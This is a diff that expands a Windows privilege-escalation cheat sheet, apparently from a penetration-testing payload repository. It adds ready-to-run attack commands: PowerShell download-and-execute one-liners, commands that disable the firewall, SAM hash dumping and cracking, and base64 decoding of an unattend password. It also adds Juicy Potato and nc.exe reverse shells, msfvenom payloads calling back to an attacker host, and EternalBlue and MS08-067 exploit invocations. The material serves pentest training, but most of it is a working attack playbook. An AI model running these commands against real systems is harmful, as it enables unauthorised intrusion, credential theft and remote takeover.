@@ -15,15 +15,30 @@
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
 * [EoP - Runas](#eop---runas)
-* [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposures)
-  * [Token Impersonation (RottenPotato)](#token-impersonation-rottenpotato)
+* [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
+* [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
+* [EoP - Impersonation Privileges](#eop---impersonation-privileges)
+  * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
+  * [Juicy Potato (abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
+* [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
+  * [MS08-067 (NetAPI)](#ms08-067-netapi)
+  * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
+  * [MS11-080 (adf.sys)](#ms11-080-afd.sys---microsoft-windows-xp-2003)
   * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
   * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
+* [References](#references)
 
 ## Tools
 
+- [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)
+    ```powershell
+    powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+    ```
 - [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
 - [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)
+    ```powershell
+    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
+    ```
 - [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
 - [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
     ```powershell
@@ -32,11 +47,12 @@
     ```
 - [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
 - [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
-- [WindowsEnumv - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
+- [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
+- [Seatbelt - A C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)
 - [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
-- [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)
+- [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
     ```powershell
-    powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+    powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
     ```
 
 ## Windows Version and Configuration
@@ -90,7 +106,6 @@ List all users
 
 ```powershell
 net user
-net user Swissky
 whoami /all
 Get-LocalUser | ft Name,Enabled,LastLogon
 Get-ChildItem C:\Users -Force | select Name
@@ -172,6 +187,13 @@ List firewall's blocked ports
 $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
 ```
 
+Disable firewall
+
+```powershell
+netsh firewall set opmode disable
+netsh advfirewall set allprofiles state off
+```
+
 List all network shares
 
 ```powershell
@@ -189,7 +211,10 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 
 ### SAM and SYSTEM files
 
+The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.
+
 ```powershell
+# Usually %SYSTEMROOT% = C:\Windows
 %SYSTEMROOT%\repair\SAM
 %SYSTEMROOT%\System32\config\RegBack\SAM
 %SYSTEMROOT%\System32\config\SAM
@@ -197,6 +222,15 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 %SYSTEMROOT%\System32\config\SYSTEM
 %SYSTEMROOT%\System32\config\RegBack\system
 ```
+
+Generate a hash file for John using `pwdump` or `samdump2`.
+
+```powershell
+pwdump SYSTEM SAM > /root/sam.txt
+samdump2 SYSTEM SAM -o sam.txt
+```
+
+Then crack it with `john -format=NT /root/sam.txt`.
 
 ### Search for file contents
 
@@ -239,7 +273,7 @@ REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
 
 ### Passwords in unattend.xml
 
-Location of the unattend.xml files
+Location of the unattend.xml files.
 
 ```powershell
 C:\unattend.xml
@@ -249,12 +283,14 @@ C:\Windows\system32\sysprep.inf
 C:\Windows\system32\sysprep\sysprep.xml
 ```
 
+Display the content of these files with `dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul`.
+
 Example content
 
 ```powershell
 <component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
     <AutoLogon>
-     <Password>*SENSITIVE*DATA*DELETED*</Password>
+     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
      <Enabled>true</Enabled>
      <Username>Administrateur</Username>
     </AutoLogon>
@@ -268,6 +304,13 @@ Example content
       </LocalAccount>
      </LocalAccounts>
     </UserAccounts>
+```
+
+Unattend credentials are stored in base64 and can be decoded manually with base64.
+
+```powershell
+$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
+SecretSecurePassword1234*
 ```
 
 The Metasploit module `post/windows/gather/enum_unattend` looks for these files.
@@ -592,10 +635,34 @@ $ computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
 ```
 
+## EoP - From local administrator to NT SYSTEM
 
-## EoP - Common Vulnerabilities and Exposure
+```powershell
+PsExec.exe -i -s cmd.exe
+```
 
-### Token Impersonation (RottenPotato)
+## EoP - Living Off The Land Binaries and Scripts
+
+Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/
+
+> The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.
+
+A LOLBin/Lib/Script must:
+
+* Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft.
+Have extra "unexpected" functionality. It is not interesting to document intended use cases.
+Exceptions are application whitelisting bypasses
+* Have functionality that would be useful to an APT or red team
+
+```powershell
+wmic.exe process call create calc
+regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+Microsoft.Workflow.Compiler.exe tests.xml results.xml
+```
+
+## EoP - Impersonation Privileges
+
+### RottenPotato (Token Impersonation)
 
 Binary available at : https://github.com/foxglovesec/RottenPotato
 Binary available at : https://github.com/breenmachine/RottenPotatoNG
@@ -616,9 +683,88 @@ Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
 ```
 
+
+### Juicy Potato (abusing the golden privileges)
+
+Binary available at : https://github.com/ohpe/juicy-potato/releases    
+
+1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
+
+    ```powershell
+    whoami /priv
+    ```
+
+2. Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object
+
+    * [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise) 
+    * [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
+    * [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
+    * [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
+    * [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise) 
+    * [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
+    * [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard) 
+
+3. Execute JuicyPotato to run a privileged command.
+
+    ```powershell
+    juicypotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
+    juicypotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+    # -l : local listener port
+    ```
+
+## EoP - Common Vulnerabilities and Exposure
+
+### MS08-067 (NetAPI)
+
+Check the vulnerability with the following nmap script.
+
+```c
+nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 <ip_netblock>
+```
+
+Metasploit modules to exploit `MS08-067 NetAPI`.
+
+```powershell
+exploit/windows/smb/ms08_067_netapi
+```
+
+If you can't use Metasploit and only want a reverse shell.
+
+```powershell
+https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
+
+Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
+Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
+Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
+Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
+Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
+Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
+Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
+python ms08-067.py 10.0.0.1 6 445
+```
+
+
+### MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7 
+
+'KiTrap0D' User Mode to Ring Escalation (MS10-015)
+
+```powershell
+https://www.exploit-db.com/exploits/11199
+
+Metasploit : exploit/windows/local/ms10_015_kitrap0d
+```
+
+### MS11-080 (afd.sys) - Microsoft Windows XP/2003
+
+```powershell
+Python: https://www.exploit-db.com/exploits/18176
+Metasploit: exploit/windows/local/ms11_080_afdjoinleaf
+```
+
 ### MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
 
-Check if the patch is installed : `wmic qfe list | find "3139914"`
+Check if the patch is installed : `wmic qfe list | findstr "3139914"`
 
 ```powershell
 Powershell:
@@ -632,12 +778,31 @@ Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
 
 ### MS17-010 (Eternal Blue)
 
+Check the vulnerability with the following nmap script.
+
 ```c
 nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>
 ```
 
+Metasploit modules to exploit `EternalRomance/EternalSynergy/EternalChampion`.
 
+```powershell
+auxiliary/admin/smb/ms17_010_command          MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+auxiliary/scanner/smb/smb_ms17_010            MS17-010 SMB RCE Detection
+exploit/windows/smb/ms17_010_eternalblue      MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+exploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+exploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+```
 
+If you can't use Metasploit and only want a reverse shell.
+
+```powershell
+git clone https://github.com/helviojunior/MS17-010
+
+# generate a simple reverse shell to use
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
+python2 send_and_execute.py 10.0.0.1 revshell.exe
+```
 
 
 ## References
@@ -668,3 +833,4 @@ nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_n
 * [Pentestlab.blog - WPE-12 - Insecure Registry Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)
 * [Pentestlab.blog - WPE-13 - Intel SYSRET](https://pentestlab.blog/2017/06/14/intel-sysret/)
 * [Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @_xpn_](https://blog.xpnsec.com/becoming-system/)
+* [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
